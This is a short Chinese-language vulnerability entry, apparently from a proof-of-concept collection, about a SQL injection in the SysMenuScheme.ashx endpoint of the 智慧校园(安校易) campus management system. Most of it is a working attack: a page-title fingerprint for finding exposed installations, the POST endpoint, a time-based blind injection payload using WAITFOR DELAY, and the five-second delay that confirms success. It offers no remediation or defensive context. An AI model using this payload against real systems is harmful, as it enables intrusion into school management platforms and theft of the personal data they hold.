# 智慧校园(安校易)管理系统SysMenuScheme.ashx存在SQL注入漏洞

智慧校园(安校易)管理系统 ｜ SQL注入 ｜ —
- **指纹**：`title="智慧综合管理平台登入"`
- **请求**：`POST /Module/Kernel/Controller/SysMenuScheme.ashx HTTP/1.1`

**Payload**
```
action=exportExcel&sname=';WAITFOR+DELAY+'0:0:5'--
:---
```
- **响应特征**：200 响应时间>=5s